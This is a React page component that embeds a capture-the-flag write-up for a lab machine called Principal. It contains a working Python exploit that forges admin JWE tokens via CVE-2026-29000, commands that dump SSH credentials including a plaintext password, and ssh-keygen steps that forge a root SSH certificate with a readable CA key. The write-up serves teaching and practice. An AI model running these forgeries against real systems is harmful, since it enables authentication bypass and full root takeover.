import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './PrincipalWalkthrough.css';

const PrincipalWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Function to parse inline markdown (bold, italic, inline code, links)
  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    
    // Regex to match [text](url), **bold**, *italic*, and `code`
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    
    while ((match = regex.exec(text)) !== null) {
      // Add text before the match
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      
      const matched = match[0];
      
      if (matched.startsWith('[') && matched.includes('](')) {
        // Link [text](url)
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        // Bold text
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        // Italic text
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        // Inline code
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      
      lastIndex = regex.lastIndex;
    }
    
    // Add remaining text
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    
    return parts.length > 0 ? parts : text;
  };

  // Principal data
    const writeup = {
    id: 'principal-walkthrough',
    title: 'Principal Walkthrough',
    excerpt: 'Principal is a medium difficulty machine that is themed around misplaced cryptographic trust. The foothold exploits CVE-2026-29000, an authentication bypass in pac4j-jwts JwtAuthenticator where a PlainJWT wrapped inside a valid JWE envelope bypasses signature verification entirely. After forging an admin token and extracting SSH credentials from the corporate dashboard, privilege escalation abuses an SSH CA configuration that trusts any certificate signed by the CA without validating the principal (username) claim, allowing us to forge a certificate for root. Both attack stages exploit the same class of flaw: a system that verifies the cryptographic envelope but never validates the identity claim inside it.',
    date: 'Mar 16, 2026',
    tags: ['Htb', 'Linux', 'Jwt', 'Pac4j', 'Ca'],
    difficulty: 'Medium',
    os: 'Linux',
    ip: '10.129.244.220',
    content: `## Overview
Principal is a medium difficulty machine that is themed around misplaced cryptographic trust. The foothold exploits [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000), an authentication bypass in pac4j-jwts JwtAuthenticator where a PlainJWT wrapped inside a valid JWE envelope bypasses signature verification entirely. After forging an admin token and extracting SSH credentials from the corporate dashboard, privilege escalation abuses an SSH CA configuration that trusts any certificate signed by the CA without validating the principal (username) claim, allowing us to forge a certificate for root. Both attack stages exploit the same class of flaw: a system that verifies the cryptographic envelope but never validates the identity claim inside it.

## Enumeration
### Port Scanning
The port scan reveals two relevant services: port 22 running OpenSSH and port 8080 running a Jetty server. The Jetty response headers expose \`X-Powered-By: pac4j-jwt/6.0.3\`, leaking the authentication framework in use and pointing toward a JWT-based login flow.
\`\`\`bash
sudo nmap -vv -sS -sV -sC -Pn -p- --min-rate=10000 10.129.244.220 -oN nmap/nmap.tcp

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy syn-ack ttl 63 Jetty
| http-title: Principal Internal Platform - Login
|_http-server-header: Jetty
|_http-open-proxy: Proxy might be redirecting requests
X-Powered-By: pac4j-jwt/6.0.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

Some important open ports are discovered:
• **TCP Port 22**: OpenSSH 9.6p1
• **TCP Port 8080**: Jetty (http-proxy) running the Principal Internal Platform, a JWT-authenticated web application powered by pac4j-jwt/6.0.3

### Service Enumeration
Navigating to port 8080 redirects to \`/login\`, revealing a corporate internal platform called **Principal Internal Platform**, a Unified Operations Dashboard. The platform advertises SSH certificate-based authentication in its description, which is already a hint toward the privilege escalation path.
![Principal Internal Platform login page](/images/writeups/principal/1.png)

Attempting default credentials (\`admin:admin\`) against the \`/api/auth/login\` endpoint returns a 401 Unauthorized with \`"message":"Invalid username or password"\`. The \`X-Powered-By: pac4j-jwt/6.0.3\` header confirms the JWT library version.
![POST /api/auth/login with admin credentials returns 401](/images/writeups/principal/3.png)

Probing further, a GET request to \`/api/auth/jwks\` returns a 200 OK with the server's RSA public key set. This JWKS endpoint is publicly accessible without authentication and exposes the key used to verify and encrypt tokens, which is exactly the material needed to exploit [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000).
![JWKS endpoint exposing RSA public key enc-key-1](/images/writeups/principal/4.png)

Searching for vulnerabilities in pac4j-jwt 6.0.3 leads to a Snyk article documenting a critical authentication bypass where a PlainJWT (unsigned, \`alg: none\`) wrapped inside a valid JWE envelope passes signature verification entirely.
![DuckDuckGo search surfacing CVE-2026-29000 and the Snyk article](/images/writeups/principal/2.png)

[CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000) is rated **CVSS 10.0 Critical** and affects pac4j-jwt versions prior to 4.5.9, 5.7.9, and 6.3.3. The root cause is a logic flaw in \`JwtAuthenticator\`: signature verification only runs when the inner token is a \`SignedJWT\`. When the library decrypts a JWE envelope and finds a \`PlainJWT\` inside, it skips signature validation entirely and trusts the claims as-is. An attacker only needs the server's **public** RSA key to mount this attack, forging any identity or role claim and wrapping it in a valid JWE to pass through authentication.

## Foothold
The exploit script forges a JWE token with admin claims (\`sub: admin\`, \`roles: [ADMIN]\`) by building a manual PlainJWT (\`alg: none\`) and encrypting it with the leaked RSA public key using RSA-OAEP + A256GCM:
\`\`\`python
#!/usr/bin/env python3
"""
CVE-2026-29000 - pac4j-jwt Authentication Bypass
JWE-Wrapped PlainJWT bypasses signature verification in JwtAuthenticator
"""

import json
import sys
from jwcrypto import jwt, jwk

TARGET = "http://10.129.244.220"

JWKS = {
    "keys": [{
        "kty": "RSA",
        "e": "AQAB",
        "kid": "enc-key-1",
        "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
    }]
}

def b64url(data: bytes) -> str:
    import base64
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def make_plain_jwt(claims: dict) -> str:
    header = b64url(json.dumps({"alg": "none"}).encode())
    payload = b64url(json.dumps(claims).encode())
    return f"{header}.{payload}."

def forge_token(claims: dict) -> str:
    keyset = jwk.JWKSet()
    keyset.import_keyset(json.dumps(JWKS))
    pub_key = keyset.get_key("enc-key-1")
    plain_str = make_plain_jwt(claims)
    jwe = jwt.JWT(
        header={"alg": "RSA-OAEP", "enc": "A256GCM", "kid": "enc-key-1", "cty": "JWT"},
        claims=plain_str
    )
    jwe.make_encrypted_token(pub_key)
    return jwe.serialize()

claims = {"sub": "admin", "roles": ["ADMIN"]}
token = forge_token(claims)
print(f"[+] Forged JWE token:\\n{token}")
\`\`\`

Running the script outputs the forged JWE token. The PlainJWT is embedded as the plaintext payload of the JWE. When the server decrypts it, it reads the claims without verifying the inner signature.
![Exploit running, forged JWE token generated with admin claims](/images/writeups/principal/5.png)

Setting the token in the browser's session storage and reloading the app bypasses authentication entirely, granting access to the admin dashboard. The dashboard reveals platform statistics and, importantly, an announcement about a **New SSH CA Rotation**: all SSH CA keys have been rotated and old certificates are no longer valid. This hints at CA-based SSH authentication as a potential privilege escalation path.
![Forged token set in session storage, authenticated access via browser DevTools](/images/writeups/principal/6.png)
![Admin dashboard with SSH CA Rotation announcement and Recent Activity log](/images/writeups/principal/7.png)

The activity log in the dashboard reveals four accounts active on the platform: \`admin\`, \`administrator\`, \`svc-deploy\`, and \`thompson\`.
![Activity log showing failed login attempts and administrative SSH certificate actions](/images/writeups/principal/9.png)

Inspecting the JavaScript source at \`/static/js/app.js\` reveals the full JWT claims schema expected by the backend, the available API endpoints (\`/api/auth/jwks\`, \`/api/auth/login\`, \`/api/dashboard\`, \`/api/users\`, \`/api/settings\`), and the role definitions (\`ROLE_ADMIN\`, \`ROLE_MANAGER\`, \`ROLE_USER\`). The \`/api/settings\` endpoint looks particularly interesting.
![app.js source leaking JWT schema, API endpoints, and role definitions](/images/writeups/principal/8.png)

### User Flag
Querying \`/api/settings\` with the forged admin token dumps the platform configuration in JSON, which includes plaintext SSH credentials for the \`svc-deploy\` service account.
\`\`\`bash
TOKEN="eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIiwia2lkIjoiZW5jLWtleS0xIn0..."

curl -s -H "Authorization: Bearer $TOKEN" http://10.129.244.220:8080/api/settings | jq
\`\`\`
![/api/settings response with SSH credentials for svc-deploy](/images/writeups/principal/10.png)

Using the recovered credentials to SSH into the machine as \`svc-deploy\` grants access and the user flag.
\`\`\`bash
ssh svc-deploy@10.129.244.220
Password: D3pl0y_$$H_Now42!
\`\`\`
![SSH login as svc-deploy and user flag](/images/writeups/principal/11.png)

## Pos Exploitation
### Privilege Escalation
Exploring the filesystem reveals the directory \`/opt/principal/ssh/\` containing a \`ca_key\` (RSA 4096-bit private key) and a \`README.txt\`. The README documents that this CA is trusted by \`sshd\` for certificate-based authentication via the \`TrustedUserCAKeys\` directive, and that \`deploy.sh\` uses it to issue short-lived certificates for service accounts.
![/opt/principal/ssh directory with ca_key, ca_key.pub, and README.txt](/images/writeups/principal/12.png)

Reading the README and \`sshd_config\` confirms that the CA signs certificates and sshd trusts any certificate it issues. The configuration does **not** restrict which principals (usernames) are valid, so a certificate signed with \`-n root\` will be accepted for the root user.
![sshd TrustedUserCAKeys config and README describing CA usage for certificate authentication](/images/writeups/principal/13.png)

The exploit is straightforward: generate a fresh ed25519 keypair, then use the \`ca_key\` to sign the public key with the principal set to \`root\`. The \`ssh-keygen -s\` command signs the certificate with a 1-hour validity window. Since \`svc-deploy\` can read \`ca_key\` directly, no privilege escalation is needed to sign.
\`\`\`bash
ssh-keygen -t ed25519 -f /tmp/key -N ""

ssh-keygen -s ca_key -I "pwned" -n root -V +1h /tmp/key
\`\`\`
![Generating the ed25519 keypair and signing the certificate with principal root](/images/writeups/principal/14.png)

### Root Flag
With the signed certificate ready, connecting as root requires no password. The certificate proves identity and the server accepts the forged principal claim without question.
\`\`\`bash
ssh -i /tmp/key root@10.129.244.220
\`\`\`
![SSH as root using the forged certificate and root flag](/images/writeups/principal/15.png)

## Conclusion
Principal is a medium Linux machine that demonstrates the dangers of trusting a cryptographic wrapper without validating the identity claim inside it.

The attack path involved:

• **Recon**: Port scan revealed SSH on port 22 and a Jetty web application on port 8080 leaking \`X-Powered-By: pac4j-jwt/6.0.3\`
• **Enumeration**: The public JWKS endpoint (\`/api/auth/jwks\`) exposed the RSA encryption key, and researching pac4j-jwt 6.0.3 surfaced [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000)
• **Foothold**: Forging a JWE-wrapped PlainJWT (\`alg: none\`) with admin claims to bypass authentication, querying \`/api/settings\` to retrieve plaintext SSH credentials for \`svc-deploy\`, and capturing the user flag
• **Privilege Escalation**: Discovering the SSH CA private key at \`/opt/principal/ssh/ca_key\`, signing a forged certificate with principal \`root\` using \`ssh-keygen -s\`, and SSH-ing in as root to capture the root flag

**Tools Used**: Nmap, Burp Suite, Python (jwcrypto), curl, ssh-keygen
`};

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/principal/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/principal/machine.png" alt="Principal" className="machine-image" />
          </div>
        </div>
      </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus 
                        key={i} 
                        title={titleMatch[1]} 
                        message={messageMatch[1]} 
                      />
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
      </div>

      <TableOfContents content={writeup.content} title={writeup.title} />
      
      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default PrincipalWalkthrough;
